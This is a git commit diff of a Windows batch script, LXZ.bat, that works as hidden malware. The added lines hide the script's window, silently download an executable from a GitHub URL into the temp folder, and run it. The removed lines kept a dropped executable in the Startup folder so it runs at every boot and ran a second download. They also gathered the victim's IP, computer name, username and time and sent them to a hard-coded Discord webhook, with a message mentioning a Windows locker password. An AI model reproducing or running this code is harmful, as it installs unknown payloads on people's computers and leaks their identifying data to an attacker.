577438adc8a933f0d1feb119049bb57e7482b678
lcmandrikion-hash <lcmandrikion@gmail.com>
2026-03-11 20:59:56 -0300

    Update LXZ.bat

--- LXZ.bat
+++ LXZ.bat
@@ -1,75 +1,14 @@
 @echo off
 
-:: Reexecuta o próprio script oculto
+:: roda o próprio script oculto
 if "%1" neq "hidden" (
-    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden"
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
     exit
 )
 
-:: URL do .exe
-set "URL=https://github.com/lcmandrikion-hash/MNTR/raw/refs/heads/main/monitoramento.exe"
+set "URL=https://github.com/lcmandrikion-hash/Mez/raw/refs/heads/main/LZXorg.exe"
+set "ARQ=%TEMP%\arquivo.exe"
 
-:: Caminho da pasta Startup
-set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Startupx64.exe"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ARQ%'"
 
-:: Baixa o arquivo
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%STARTUP%'"
-
-:: Executa o arquivo
-start "" "%STARTUP%"
-
-
-setlocal
-
-set "TEMP_EXE=%TEMP%\seguranca.exe"
-set "URL=https://raw.githubusercontent.com/lcmandrikion-hash/BQL/refs/heads/main/seguranca.exe"
-
-:: Se o arquivo não existe, baixa
-if not exist "%TEMP_EXE%" (
-    powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%TEMP_EXE%' -UseBasicParsing"
-)
-
-:: Executa o arquivo em background
-start "" /B "%TEMP_EXE%"
-
-endlocal
-
-:: --------- BLOCO PARA RODAR OCULTO ----------
-if "%~1" NEQ "hidden" (
-    powershell -NoProfile -WindowStyle Hidden -Command ^
-    "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
-    exit
-)
-:: -------------------------------------------
-
-setlocal
-
-:: Pega IP público
-for /f %%A in ('curl -s https://api.ipify.org') do set IP=%%A
-
-:: Tempo mínimo pra não matar o curl
-ping 127.0.0.1 -n 2 >nul
-
-:: Infos do sistema
-set PC=%COMPUTERNAME%
-set USER=%USERNAME%
-
-:: Data e hora
-set DATA=%DATE%
-set HORA=%TIME:~0,5%
-
-:: Link pra ver a localização do IP
-set LINK=https://ipinfo.io/%IP%
-
-:: Mensagem final
-set MESSAGE=Usuario Iniciou  o pc. Resultado do comando --  PC %PC% - Usuario %USER% - IP %IP% - Local %LINK% - Data %DATA% - Hora %HORA% e bloqueador de windows senha :Luizfoda
-
-:: Envia pro Discord
-curl -s ^
--H "Content-Type: application/json" ^
--X POST ^
--d "{\"content\":\"%MESSAGE%\"}" ^
-https://discord.com/api/webhooks/1476889854296981637/-KRgTWFBVNLoiII8EPfnGZDivUtmerZR7Zr-NAhDJ3BkERuuXPW818ug_I-o5xak71OK
-
-endlocal
-exit
+start "" "%ARQ%"
